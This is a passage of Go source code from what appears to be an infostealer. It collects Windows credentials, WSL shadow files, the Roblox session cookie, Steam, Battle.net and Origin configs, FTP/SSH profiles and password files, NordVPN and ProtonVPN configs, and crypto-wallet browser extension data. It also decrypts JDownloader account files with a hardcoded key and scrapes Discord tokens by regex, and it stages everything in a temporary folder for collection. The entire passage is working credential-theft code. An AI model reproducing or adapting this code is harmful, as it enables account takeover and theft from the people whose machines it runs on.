				_ = CompressZIP(os.Getenv("APPDATA")+"\\Microsoft\\Credentials\\", os.Getenv("APPDATA")+"\\tmpResults\\MicrosoftCredentials.zip")
			}
		}
	}
	//Processes
	IssuePowershell(`WMIC /OUTPUT:"` + os.Getenv("APPDATA") + "\\tmpResults\\" + "Processes.txt" + `" path win32_process get Processid,Caption,Commandline`)
	//Installed Applications
	IssuePowershell(`WMIC /OUTPUT:"` + os.Getenv("APPDATA") + "\\tmpResults\\" + "Installed.txt" + `" path Win32_Product get Name,Vendor,Version,InstallDate,InstallLocation`)
	//Windows Subsystem For Linux Shadows
	if _, err := os.Stat(os.Getenv("LocalAppData") + "\\Packages\\"); !os.IsNotExist(err) {
		files, err := ioutil.ReadDir(os.Getenv("LocalAppData") + "\\Packages\\")
		if err == nil {
			for _, file := range files {
				if strings.Contains(file.Name(), "shadow") {
					_ = CopyFileToDirectory(os.Getenv("LocalAppData")+"\\Packages\\"+file.Name(), os.Getenv("APPDATA")+"\\tmpResults\\"+"WindowsSubsystemForLinux_"+file.Name())
				}
			}
		}
	}
}

func GetOthers() {
	//Claws-Mail

	//Outlook

	//CoreFTP

	//Roblox
	registryKey, _ := registry.OpenKey(registry.CURRENT_USER, `Software\Roblox\RobloxStudioBrowser\roblox.com`, registry.QUERY_VALUE)
	defer registryKey.Close()
	keyEntry, _, err := registryKey.GetStringValue(".ROBLOSECURITY")
	if err == nil || len(keyEntry) != 0 {
		file, _ := os.Create(os.Getenv("APPDATA") + "\\tmpResults\\Roblox.json")
		tempCookie := CookieStruct{
			Browser: "Roblox-Studio",
			Name:    ".ROBLOSECURITY",
			Host:    "https://roblox.com",
			Path:    "/login",
			Value:   keyEntry[46 : len(keyEntry)-1],
		}
		b, _ := json.Marshal(tempCookie)
		_, _ = file.WriteString(string(b))
		_ = file.Close()
	}
	//Steam
	val, err := GetRegistryKeyValue(registry.CURRENT_USER, "Software\\Valve\\Steam", "Steampath")
	if err == nil {
		fixedPath := strings.ReplaceAll(val, "/", "\\")
		if _, err := os.Stat(fixedPath + "\\config\\"); !os.IsNotExist(err) {
			_ = CompressZIP(fixedPath+"\\config\\", os.Getenv("APPDATA")+"\\tmpResults\\Steam.zip")
		}
	}
	//BattleNET
	if _, err := os.Stat(os.Getenv("APPDATA") + "\\Battle.net\\"); !os.IsNotExist(err) {
		files, err := ioutil.ReadDir(os.Getenv("APPDATA") + "\\Battle.net\\")
		if err == nil {
			for _, file := range files {
				if strings.Contains(file.Name(), ".db") || strings.Contains(file.Name(), ".config") {
					_ = CopyFileToDirectory(os.Getenv("APPDATA")+"\\Battle.net\\"+file.Name(), os.Getenv("APPDATA")+"\\tmpResults\\"+"BattleNET_"+file.Name())
				}
			}
		}
	}
	//osu!
	if _, err := os.Stat(os.Getenv("LocalAppData") + "\\osu!\\"); !os.IsNotExist(err) {
		files, err := ioutil.ReadDir(os.Getenv("LocalAppData") + "\\osu!\\")
		if err == nil {
			for _, file := range files {
				if strings.Contains(file.Name(), "osu!") && strings.HasSuffix(file.Name(), "cfg") {
					_ = CopyFileToDirectory(os.Getenv("LocalAppData")+"\\osu!\\"+file.Name(), os.Getenv("APPDATA")+"\\tmpResults\\"+"1Password_"+file.Name())
				}
			}
		}
	}
	//Origin
	if _, err := os.Stat(os.Getenv("AppData") + "\\Origin\\"); !os.IsNotExist(err) {
		files, err := ioutil.ReadDir(os.Getenv("AppData") + "\\Origin\\")
		if err == nil {
			for _, file := range files {
				if strings.Contains(file.Name(), "local") && strings.HasSuffix(file.Name(), "xml") {
					_ = CopyFileToDirectory(os.Getenv("AppData")+"\\"+file.Name(), os.Getenv("APPDATA")+"\\tmpResults\\"+"Origin_"+file.Name())
				}
			}
		}
	}
	//Galcon Fusion
	val, err = GetRegistryKeyValue(registry.CURRENT_USER, "Software\\Valve\\Steam", "Steampath")
	if err == nil {
		fixedPath := strings.ReplaceAll(val, "/", "\\")
		if _, err := os.Stat(fixedPath + "\\userdata\\"); !os.IsNotExist(err) {
			folders, err := ioutil.ReadDir(fixedPath + "\\userdata\\")
			if err == nil {
				for _, folder := range folders {
					if folder.IsDir() {
						if CheckIfFileExists(fixedPath + "\\userdata\\" + folder.Name() + "\\44200\\remote\\galcon.cfg") {
							_ = CopyFileToDirectory(fixedPath+"\\userdata\\"+folder.Name()+"\\44200\\remote\\galcon.cfg", os.Getenv("APPDATA")+"\\tmpResults\\GalconFusion.txt")
						}
					}
				}
			}
		}
	}
	//Turba
	val, err = GetRegistryKeyValue(registry.CURRENT_USER, "Software\\Valve\\Steam", "Steampath")
	if err == nil {
		fixedPath := strings.ReplaceAll(val, "/", "\\")
		if _, err := os.Stat(fixedPath + "\\SteamApps\\common\\"); !os.IsNotExist(err) {
			if CheckIfFileExists(fixedPath + "\\SteamApps\\common\\Turba\\Assets\\Settings.bin") {
				_ = CopyFileToDirectory(fixedPath+"\\SteamApps\\common\\Turba\\Assets\\Settings.bin", os.Getenv("APPDATA")+"\\tmpResults\\Turba.txt")
			}
		}
	}
	//RamBox
	if _, err := os.Stat(os.Getenv("APPDATA") + "\\RamBox\\Partitions\\"); !os.IsNotExist(err) {
		c, _ := os.ReadDir(os.Getenv("APPDATA") + "\\RamBox\\Partitions\\")
		for _, entry := range c {
			if entry.IsDir() {
				_ = CompressZIP(os.Getenv("APPDATA")+"\\RamBox\\Partitions\\"+entry.Name()+"\\Local Storage\\leveldb\\", os.Getenv("APPDATA")+"\\tmpResults\\RamBox_"+entry.Name()+"_Storage.zip")
				_ = CompressZIP(os.Getenv("APPDATA")+"\\RamBox\\Partitions\\"+entry.Name()+"\\Cookies\\", os.Getenv("APPDATA")+"\\tmpResults\\RamBox_"+entry.Name()+"_Cookies.zip")
			}
		}
	}
	//AbleFTP, JaSFTP and Automize
	var ProductNames = [...]string{"AbleFTP", "JaSFtp", "Automize"}
	for i := 0; i < len(ProductNames); i++ {
		for in := 0; in < 15; in++ {
			if CheckIfFileExists(os.Getenv("ProgramFiles") + "\\" + ProductNames[i] + strconv.Itoa(in) + "\\data\\settings\\ftpProfiles-j.jsd") {
				_ = CopyFileToDirectory(os.Getenv("ProgramFiles")+"\\"+ProductNames[i]+strconv.Itoa(in)+"\\data\\settings\\ftpProfiles-j.jsd", os.Getenv("APPDATA")+"\\tmpResults\\"+ProductNames[i]+strconv.Itoa(in)+"_FTP.txt")
			}
			if CheckIfFileExists(os.Getenv("ProgramFiles") + "\\" + ProductNames[i] + strconv.Itoa(in) + "\\data\\settings\\sshProfiles-j.jsd") {
				_ = CopyFileToDirectory(os.Getenv("ProgramFiles")+"\\"+ProductNames[i]+strconv.Itoa(in)+"\\data\\settings\\sshProfiles-j.jsd", os.Getenv("APPDATA")+"\\tmpResults\\"+ProductNames[i]+strconv.Itoa(in)+"_SSH.txt")
			}
			if CheckIfFileExists(os.Getenv("ProgramFiles") + "\\" + ProductNames[i] + strconv.Itoa(in) + "\\encPwd.jsd") {
				_ = CopyFileToDirectory(os.Getenv("ProgramFiles")+"\\"+ProductNames[i]+strconv.Itoa(in)+"\\encPwd.jsd", os.Getenv("APPDATA")+"\\tmpResults\\"+ProductNames[i]+strconv.Itoa(in)+"_PWD.txt")
			}
		}
	}
	//NordVPN
	if _, err := os.Stat(os.Getenv("LocalAppData") + "\\NordVPN\\"); !os.IsNotExist(err) {
		c, _ := os.ReadDir(os.Getenv("LocalAppData") + "\\NordVPN\\")
		for _, entry := range c {
			if entry.IsDir() {
				cc, _ := os.ReadDir(os.Getenv("LocalAppData") + "\\NordVPN\\" + entry.Name() + "\\")
				for _, entry1 := range cc {
					if entry1.IsDir() {
						if CheckIfFileExists(os.Getenv("LocalAppData") + "\\NordVPN\\" + entry.Name() + "\\" + entry1.Name() + "\\user.config") {
							_ = CopyFileToDirectory(os.Getenv("LocalAppData")+"\\NordVPN\\"+entry.Name()+"\\"+entry1.Name()+"\\user.config", os.Getenv("APPDATA")+"\\tmpResults\\NordVPN.txt")
						}
					}
				}
			}
		}
	}
	//ProtonVPN
	if _, err := os.Stat(os.Getenv("LocalAppData") + "\\ProtonVPN\\"); !os.IsNotExist(err) {
		c, _ := os.ReadDir(os.Getenv("LocalAppData") + "\\ProtonVPN\\")
		for _, entry := range c {
			if entry.IsDir() {
				cc, _ := os.ReadDir(os.Getenv("LocalAppData") + "\\ProtonVPN\\" + entry.Name() + "\\")
				for _, entry1 := range cc {
					if entry1.IsDir() {
						if CheckIfFileExists(os.Getenv("LocalAppData") + "\\ProtonVPN\\" + entry.Name() + "\\" + entry1.Name() + "\\user.config") {
							_ = CopyFileToDirectory(os.Getenv("LocalAppData")+"\\ProtonVPN\\"+entry.Name()+"\\"+entry1.Name()+"\\user.config", os.Getenv("APPDATA")+"\\tmpResults\\ProtonVPN.txt")
						}
					}
				}
			}
		}
	}
	//JDownloader
	if CheckIfFileExists(os.Getenv("LocalAppData") + "\\JDownloader v2.0\\cfg\\org.jdownloader.settings.AccountSettings.accounts.ejs") {
		key := []byte{1, 6, 4, 5, 2, 7, 4, 3, 12, 61, 14, 75, 254, 249, 212, 33}
		encryptedData, _ := ioutil.ReadFile(os.Getenv("LocalAppData") + "\\JDownloader v2.0\\cfg\\org.jdownloader.settings.AccountSettings.accounts.ejs")
		n, _ := os.Create(os.Getenv("APPDATA") + "\\tmpResults\\JDownloader.txt")
		_, _ = n.WriteString(string(AESDecrypt(encryptedData, key)))
		_ = n.Close()
	}
	//Chrome Plugins TODO: Rework to use Browser Stealer list of browser and try each Chrome based one
	browsers := [...]string{`Google\Chrome`, `BraveSoftware\Brave-Browser`, `Chromium`}
	for _, browser := range browsers {
		for name, plugin := range PluginsToSteal {
			if _, err := os.Stat(os.Getenv("LocalAppData") + "\\" + browser + "\\User Data\\Default\\Local Extension Settings\\" + plugin.Path + "\\"); !os.IsNotExist(err) {
				_ = CompressZIP(os.Getenv("LocalAppData")+"\\"+browser+"\\User Data\\Default\\Local Extension Settings\\"+plugin.Path+"\\", os.Getenv("APPDATA")+"\\tmpResults\\"+name+"_Plugin.zip")
			}
		}
	}
	//Discord Tokens
	var tmpDiscFile string
	for _, path := range Discords {
		if _, err := os.Stat(path); err == nil {
			path += "\\Local Storage\\leveldb\\"
			files, err := ioutil.ReadDir(path)
			if err != nil {
				continue
			}
			for _, file := range files {
				if strings.HasSuffix(file.Name(), ".ldb") || strings.HasSuffix(file.Name(), ".log") {
					data, err := ioutil.ReadFile(path + file.Name())
					if err != nil {
						continue
					}
					reNotmfa, err := regexp.Compile(`[\w-]{24}\.[\w-]{6}\.[\w-]{27}`)
					if err == nil {
						if string(reNotmfa.Find(data)) != "" {
							tmpDiscFile = tmpDiscFile + "Token found : `" + string(reNotmfa.Find(data)) + "`\r\n"
						}
					}
					reMfa, err := regexp.Compile(`mfa\.[\w-]{84}`)
					if err == nil {
						if string(reMfa.Find(data)) != "" {
							tmpDiscFile = tmpDiscFile + "Token found : `" + string(reNotmfa.Find(data)) + "`\r\n"
						}
					}
				}
			}
		} else {
			continue
		}
	}
	_ = CreateFileAndWriteData(os.Getenv("APPDATA")+"\\tmpResults\\Discord Tokens.txt", []byte(tmpDiscFile))
}
